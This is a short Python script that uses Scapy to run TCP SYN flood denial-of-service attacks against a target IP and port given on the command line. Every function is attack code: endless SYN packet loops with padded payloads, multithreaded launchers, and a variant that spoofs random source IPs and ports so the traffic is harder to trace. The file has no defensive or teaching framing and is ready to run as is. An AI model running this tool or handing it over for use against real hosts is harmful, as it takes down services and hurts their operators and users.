# Example SYN flood attacks using Scapy

from scapy.all import send, RandShort, Raw, RandIP
from scapy.layers.inet import TCP, IP
import sys
import threading


def simple_attack(target_ip: str, target_port: int) -> None:
    """Launches a simple SYN flood attack against a specific target."""

    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / Raw(b"A" * 1024)
    send(syn_packet, loop = 1, verbose = 0)

def multithreading_simple_attack(target_ip: str, target_port: int, threads: int) -> None:
    for i in range(threads):
        thread = threading.Thread(None, simple_attack, args=(target_ip, target_port))
        thread.start()
        print(f"Thread {i} SYN Flood attack started.")

def randomized_attack(target_ip: str, target_port: int) -> None:
    """Executes a SYN flood attack with randomized source IPs and source ports."""

    ip = IP(dst=target_ip, src=RandIP())
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    data = Raw(b"A" * 1024)
    syn_packet = ip / tcp / data

    send(syn_packet, loop = 1, verbose = 0)

def multithreading_randomized_attack(target_ip: str, target_port: int, threads: int) -> None:
    for i in range(threads):
        thread = threading.Thread(None, randomized_attack, args=(target_ip, target_port))
        thread.start()
        print(f"Thread {i} SYN Flood attack started.")


def main():
    multithreading_simple_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
